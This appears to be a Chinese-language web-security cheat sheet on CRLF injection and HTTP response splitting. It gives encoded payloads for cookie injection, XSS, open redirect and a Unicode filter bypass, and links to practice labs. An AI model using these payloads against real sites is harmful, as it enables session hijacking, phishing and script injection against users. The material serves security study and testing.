# 回车换行符注入

> CRLF 注入是一种网络安全漏洞，当攻击者向应用程序注入意外的回车符（CR）(\r) 和换行符（LF）(\n) 时就会发生。这些字符在网络协议（如 HTTP、SMTP 等）中用于表示一行的结束和新的一行的开始。在 HTTP 协议中，CR-LF 序列总是用来终止一行。

## 概述

* [方法论](#方法论)
    * [会话固定](#会话固定)
    * [跨站脚本攻击](#跨站脚本攻击)
    * [开放重定向](#开放重定向)
* [过滤器绕过](#过滤器绕过)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 方法论

HTTP 响应拆分是一种安全漏洞，攻击者通过向响应头注入回车符（CR）和换行符（LF）字符（统称为 CRLF），来操纵 HTTP 响应。在 HTTP 响应中，这些字符标记了头部的结束和新行的开始。

**CRLF 字符**：

* `CR` (`\r`, ASCII 13)：将光标移动到行首。
* `LF` (`\n`, ASCII 10)：将光标移动到下一行。

通过注入 CRLF 序列，攻击者可以将响应分成两部分，从而有效地控制 HTTP 响应的结构。这可能导致各种安全问题，例如：

* 跨站脚本攻击（XSS）：在第二个响应中注入恶意脚本。
* 缓存中毒：迫使错误的内容存储在缓存中。
* 头部操作：更改头部以误导用户或系统。

### 会话固定

典型的 HTTP 响应头如下所示：

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

如果未经清理就嵌入了用户输入 `value\r\nSet-Cookie: admin=true`：

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

现在攻击者已经设置了他们自己的 cookie。

### 跨站脚本攻击

除了需要非常不安全的方式来处理用户会话的会话固定之外，利用 CRLF 注入的最简单方法是为页面编写新的正文。它可以用来创建网络钓鱼页面或触发任意 JavaScript 代码（XSS）。

**请求页面**：

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

**HTTP 响应**：

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```

在 XSS 的情况下，CRLF 注入允许注入 `X-XSS-Protection` 头部，其值为“0”，以禁用它。然后我们可以添加包含 JavaScript 代码的 HTML 标签。

**请求页面**：

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**HTTP 响应**：

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

### 开放重定向

注入一个 `Location` 头部，强制用户重定向。

```ps1
%0d%0aLocation:%20http://myweb.com
```

## 过滤器绕过

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) 指出大多数 HTTP 头字段值仅使用 US-ASCII 字符集的一个子集。

> 新定义的头字段应将其字段值限制为 US-ASCII 八位字节。

Firefox 遵循该规范，在设置 Cookie 时剥离任何超出范围的字符，而不是对其进行编码。

| UTF-8 字符 | 十六进制 | Unicode | 剥离 |
| ---------- | -------- | ------- | ---- |
| `嘊`       | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍`       | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾`       | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
| `嘼`       | `%E5%98%BC` | `\u563c` | `%3C` (<)  |

UTF-8 字符 `嘊` 在其十六进制格式的最后部分包含 `0a`，这会被 Firefox 转换为 `\n`。

一个使用 UTF-8 字符的示例有效载荷将是：

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

URL 编码版本

```js
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

## 实验室

* [PortSwigger - 通过 CRLF 注入进行 HTTP/2 请求拆分](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)

## 参考文献

* [CRLF 注入 - CWE-93 - OWASP - 2022 年 5 月 20 日](https://www.owasp.org/index.php/CRLF_Injection)
* [Twitter 上的 CRLF 注入或为什么黑名单失败 - XSS Jigsaw - 2015 年 4 月 21 日](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
* [星巴克: [newscdn.starbucks.com] CRLF 注入, XSS - Bobrov - 2016 年 12 月 20 日](https://vulners.com/hackerone/H1:192749)